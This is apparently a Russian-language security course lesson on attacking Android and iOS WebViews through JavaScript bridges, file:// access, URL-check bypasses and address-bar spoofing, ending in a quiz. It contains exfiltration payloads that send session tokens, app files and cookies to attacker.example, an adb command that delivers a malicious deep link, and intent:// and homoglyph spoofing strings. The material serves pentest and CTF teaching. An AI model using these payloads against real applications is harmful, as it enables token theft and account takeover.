---
id: mobile-webview-deep
title: "WebView deep: JS-мосты, доступ к файлам и спуфинг URL"
category: mobile
parent: mobile-webview
difficulty: hard
order: 4
tags: [webview, javascript-interface, file-access, url-spoofing, android, xss, ssrf]
prerequisites: [mobile-webview, mobile-android-anatomy]
useful_for:
  - "CTF Mobile (XSS через WebView -> флаг)"
  - "Bug bounty (кража токенов через WebView)"
  - "Пентест мобильных приложений"
estimated_minutes: 40
summary: "Продвинутые атаки на WebView: эксплуатация JS-мостов, доступ к file://, спуфинг адресной строки, SSRF из веб-контекста и цепочки до RCE/ATO."
---
## Что делает WebView опасным

WebView — это полноценный браузерный движок внутри приложения. Сам по себе он не уязвимость. Опасность возникает из **сочетания** трёх условий: WebView загружает контент, который атакующий может контролировать (удалённую страницу, deep-link с URL, ответ сервера), в веб-контексте доступны мощные примитивы (JS-мост к нативному коду, доступ к `file://`, доступ к cookies/токенам), и нативные обработчики доверяют веб-контенту (передают секреты, выполняют действия). Когда эти три сходятся, обычный XSS превращается в кражу токенов, обход авторизации и потенциальный RCE.

Ментальная модель: **граница между «веб-миром» и «нативным миром» должна быть односторонней и строгой**. Всё, что делает её проницаемой в сторону нативного кода или файловой системы, — потенциальная уязвимость.

## Полный список опасных настроек

Проверяйте `WebSettings` и загрузку URL. Каждая из этих строк — красный флаг:

```java
WebSettings s = webView.getSettings();
s.setJavaScriptEnabled(true);                              // нужен для XSS
s.setAllowFileAccess(true);                                // file:// доступен
s.setAllowContentAccess(true);                             // content:// доступен
s.setAllowFileAccessFromFileURLs(true);                    // file:// читает file://
s.setAllowUniversalAccessFromFileURLs(true);               // file:// читает ВСЁ (критично)
s.setAllowFileAccessFromFileURLs(true);
s.setJavaScriptCanOpenWindowsAutomatically(true);
webView.addJavascriptInterface(new JsBridge(), "Android"); // мост к нативному коду
webView.loadUrl(getIntent().getStringExtra("url"));        // загрузка извне
webView.setWebViewClient(new WebViewClient() {             // нет проверки схем
    @Override public boolean shouldOverrideUrlLoading(WebView v, String url) { return false; }
});
```

Поиск в декомпилированном коде:

```bash
grep -rn "addJavascriptInterface\|setAllowFileAccess\|setAllowUniversalAccess\|setAllowFileAccessFromFileURLs\|setJavaScriptEnabled\|loadUrl\|loadDataWithBaseURL" out_jadx | head -40
```

Отдельно ищите `loadDataWithBaseURL` с `baseURL` на чужом домене — это позволяет подгружать локальные ресурсы и обходить origin-политику.

## addJavascriptInterface: как работает мост и его атаки

`addJavascriptInterface(obj, "name")` открывает JS-код в WebView доступ к публичным методам `obj` через `window.name`. Если WebView грузит удалённую страницу, атакующий через XSS вызывает эти методы.

```java
class JsBridge {
    @JavascriptInterface
    public String getToken() { return sessionToken; }        // утечка токена
    @JavascriptInterface
    public void saveToFile(String data) { /* запись файла */ } // запись данных
    @JavascriptInterface
    public String readFile(String path) { return ...; }       // чтение файлов (RCE-путь)
}
```

Атака с удалённой страницы:

```html
<script>
  // украсть токен
  fetch('https://attacker.example/steal?t=' + encodeURIComponent(Android.getToken()));
  // прочитать файл и отправить
  fetch('https://attacker.example/steal?f=' + encodeURIComponent(Android.readFile('/data/data/com.target.app/files/secret')));
</script>
```

Ключевые нюансы: методы должны быть помечены `@JavascriptInterface` (на API 17+ иначе недоступны); статические методы/поля тоже доступны; если мост даёт `Runtime.exec` или reflection — это прямой RCE. Даже «безобидный» мост вроде `getDeviceId` утекает PII.

## Доступ к file:// и universal access

`setAllowUniversalAccessFromFileURLs(true)` — самая опасная настройка: страница, загруженная через `file://`, может делать XHR на любой origin, читать локальные файлы и отправлять их наружу. Если атакующий может заставить WebView открыть `file://` с его HTML (через deep link, загрузку файла, `loadUrl` извне), он читает приватные файлы приложения.

```html
<!-- evil.html, открытый через file:// -->
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'file:///data/data/com.target.app/shared_prefs/auth.xml', false);
  x.send();
  fetch('https://attacker.example/steal', {method:'POST', body:x.responseText});
</script>
```

Даже без universal access `file://`-навигация на `content://` или `file://` других приложений бывает опасна (обход same-origin через редиректы).

## Спуфинг URL (адресной строки)

Если приложение показывает пользователю URL из WebView (адресную строку, «вы на сайте банка»), атакующий может её подделать. Классика: URL с `@`, юникод-гомоглифы, длинные пути, `javascript:`-псевдосхемы.

```
https://evil.com@www.bank.example/       # реальный хост — evil.com
https://www.bank.example.evil.com/        # реальный хост — evil.com
https://www.bаnk.example/                 # 'а' — кириллическая (гомоглиф)
```

Также встречается спуфинг через `onReceivedTitle` (заголовок страницы подменяет URL) и через `shouldOverrideUrlLoading`, который не проверяет схему и позволяет `intent://`-редиректы на произвольные компоненты.

## WebViewClient/WebChromeClient: опасные переопределения

- `onReceivedSslError` с `handler.proceed()` — игнорирует ошибки сертификата → MITM. Это фактически «отключённый TLS».
- `shouldOverrideUrlLoading` возвращает `false` без фильтра схемы → загрузка `intent://`, `file://`, `content://`.
- `onJsAlert`/`onJsPrompt` без проверки origin → утечка данных в диалоги.
- `onPageStarted`/`onPageFinished` показывают URL пользователю → спуфинг.

```bash
grep -rn "onReceivedSslError\|proceed()\|shouldOverrideUrlLoading\|onJsPrompt\|onJsAlert" out_jadx | head
```

## Разобранный пример: кража токена через XSS в WebView

Сценарий: приложение открывает в WebView страницу, URL которой приходит из deep link, JS включён, есть мост `Android` с методом `getToken`, universal access выключен, но удалённый контент грузится.

```bash
# 1. находим точку входа
grep -rn "loadUrl\|addJavascriptInterface" out_jadx | head
# → loadUrl(intent.getStringExtra("url")); addJavascriptInterface(bridge, "Android")

# 2. проверяем deep link в манифесте
grep -n "scheme\|host" out/AndroidManifest.xml
# → myapp://open?url=...

# 3. формируем ссылку на наш хост с XSS
adb shell am start -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.example/evil.html"
```

`evil.html` вызывает `Android.getToken()` и отправляет на наш сервер. Токен утёк. Если мост позволяет `readFile`, добавляем эксфильтрацию файлов; если есть reflection — пробуем RCE.

## Справочная таблица опасных API

| API | Риск | Условие эксплуатации |
|-----|------|----------------------|
| `addJavascriptInterface` | вызов нативных методов из JS | XSS / удалённый контент |
| `setAllowUniversalAccessFromFileURLs` | чтение любых файлов | открытие `file://` с evil HTML |
| `setAllowFileAccessFromFileURLs` | чтение локальных файлов | `file://` навигация |
| `setAllowFileAccess` | доступ к `file://` | любая загрузка `file://` |
| `onReceivedSslError`+`proceed` | MITM | любой HTTPS |
| `shouldOverrideUrlLoading` без фильтра | intent/схема-редирект | контролируемый URL |
| `loadUrl` из внешнего ввода | загрузка чужого контента | deep link / extra |
| `loadDataWithBaseURL` | обход origin | подмена baseURL |

## Типовые ошибки новичка

- **Считать, что `setJavaScriptEnabled(false)` спасает.** Тогда не работает и сам сайт; а если JS включён — смотрите на мосты и file-access.
- **Не проверять, откуда приходит URL.** Именно внешний ввод (deep link, push, extra) делает WebView точкой входа.
- **Игнорировать cookies.** WebView делит `CookieManager` с приложением; XSS может читать/подделывать сессию.
- **Забыть про нативный контент.** Если мост вызывает нативный код с параметрами, ищите инъекции уже в native (`.so`).
- **Тестировать только «свой» HTML.** Настоящая эксплуатация — через домен, который приложение реально загружает (часто доверенный, но с XSS).

## Что дальше / решение

Порядок: (1) найти все `loadUrl`/`addJavascriptInterface`/file-access-настройки; (2) определить, контролируете ли вы загружаемый контент (deep link, extra, серверный ответ); (3) если да — собрать `evil.html` и проверить вызов моста, чтение `file://`, спуфинг; (4) при наличии нативного моста — перейти в `mobile-android-native`. Связанные уроки: `mobile-webview` (основы), `mobile-intents-deeplinks` (как доставить URL), `mobile-ssl-pinning` (перехват трафика WebView), `mobile-insecure-storage` (что читать через file://). Решение — воспроизводимый PoC: ссылка → утёкший токен/файл.

## Продвинутые трюки: обход проверок схем и спуфинг

Приложения часто фильтруют URL (проверяют префикс `https://trusted.example`), но делают это наивно. Обходы:

- **Регистр и поддомены:** `https://trusted.example.evil.com` проходит проверку `startsWith("https://trusted.example")`? Нет, но `startsWith("trusted.example")` — да.
- **userinfo-трюк:** `https://trusted.example@evil.com/` — реальный хост `evil.com`.
- **Фрагмент и путь:** `https://evil.com/?https://trusted.example` — строка содержит доверенный префикс.
- **`javascript:`-псевдосхема:** `javascript:fetch('https://attacker/'+document.cookie)` в `loadUrl` исполняется в текущем origin.
- **`intent:`-схема:** `intent://evil#Intent;scheme=https;package=com.target.app;S.url=...;end` — редирект на произвольный компонент.
- **`data:` и `about:`** — иногда не фильтруются и дают исполнение.

Для спуфинга адресной строки используйте невидимые Unicode-символы (`U+2028`, RTL-override `U+202E`) и гомоглифы кириллицы/латиницы. Проверка: откройте URL в эмуляторе и посмотрите, как он рендерится в UI приложения.

## Практический чек-лист тестирования WebView

1. Найдите все `WebView` и их настройки (`grep` выше).
2. Определите источники URL: deep link, `getIntent().getStringExtra`, push, серверный ответ, локальный файл.
3. Проверьте `addJavascriptInterface`: какие методы доступны и что они делают.
4. Проверьте file-access: `setAllowFileAccess*`, `setAllowUniversalAccessFromFileURLs`.
5. Проверьте `WebViewClient`: `onReceivedSslError`, `shouldOverrideUrlLoading`, обработчики диалогов.
6. Проверьте cookies (`CookieManager`) — общие ли они с сессией приложения.
7. Соберите PoC-страницу и доставьте её через реальную точку входа.
8. Оцените impact: утечка токена, чтение файлов, обход авторизации, RCE.

## Связанные уязвимости и цепочки

WebView редко бывает изолированной находкой. Типовые цепочки: deep link → `loadUrl` → XSS → JS-мост → кража токена → **захват аккаунта** (`mobile-account-takeover`); file-access → чтение `shared_prefs` с токеном → подмена сессии; WebView + `intent:` → открытие внутреннего экрана → обход авторизации (`mobile-intents-deeplinks`). Именно цепочка определяет severity: сам XSS в WebView может быть «low», а цепочка до ATO — «critical».

## Отличия Android WebView и iOS WKWebView

На iOS аналог — `WKWebView` (старый `UIWebView` запрещён). Мосты там реализуются через `WKScriptMessageHandler` (метод `postMessage` из JS), а не `addJavascriptInterface`. Опасность та же: если `WKUserContentController` добавляет обработчик с чувствительными действиями, XSS на удалённой странице вызывает его. `WKPreferences`/`WKWebViewConfiguration` тоже имеют флаги доступа к файлам (`allowFileAccessFromFileURLs`, `allowUniversalAccessFromFileURLs`). На iOS особенно важно проверять `decidePolicyFor navigationAction` — аналог `shouldOverrideUrlLoading`, где решается, загружать ли URL и открывать ли его во внешнем браузере. Проверяйте также `loadFileURL:allowingReadAccessToURL:` — слишком широкий `readAccess` открывает доступ к приватным файлам приложения.

## Квиз

```quiz
- question: "Какая настройка WebView критически опасна с удалённым контентом?"
  options:
    - "setAllowUniversalAccessFromFileURLs(true)"
    - "setJavaScriptEnabled(false)"
    - "setCacheMode"
    - "setSupportZoom"
  answer: 0
  explanation: "Она разрешает страницам из file:// доступ куда угодно (SSRF/чтение файлов)."
- question: "Чем опасен addJavascriptInterface с удалённым контентом?"
  options:
    - "XSS получает доступ к нативным методам моста"
    - "Он замедляет рендер"
    - "Он блокирует HTTPS"
    - "Он удаляет cookies"
  answer: 0
  explanation: "JS-мост превращает XSS в доступ к нативному коду."
- question: "Как обойти проверку url.startsWith('https://trusted')?"
  options:
    - "https://trusted.evil.com"
    - "https://evil.com/trusted"
    - "http://trusted"
    - "https://trusted"
  answer: 0
  explanation: "Суффиксный домен проходит startsWith, но ведёт на чужой хост."
- question: "К чему ведёт file:// + XSS?"
  options:
    - "Чтение локальных файлов и SSRF"
    - "Ускорение WebView"
    - "Смена сертификата"
    - "Очистка кэша"
  answer: 0
  explanation: "file-контекст с universal access даёт доступ к файлам и сети."
- question: "Зачем злоумышленнику спуфинг адресной строки?"
  options:
    - "Чтобы выдать вредоносную страницу за доверенную (фишинг)"
    - "Чтобы ускорить загрузку"
    - "Чтобы сжать трафик"
    - "Чтобы сменить язык"
  answer: 0
  explanation: "Подделка URL обманывает пользователя."
```

## Где пригодится

- **CTF Mobile:** XSS→мост→флаг.
- **Bug bounty:** кража токенов через WebView.
- **Пентест:** аудит встроенных браузеров.
- **Работа:** ревью WebView-настроек.
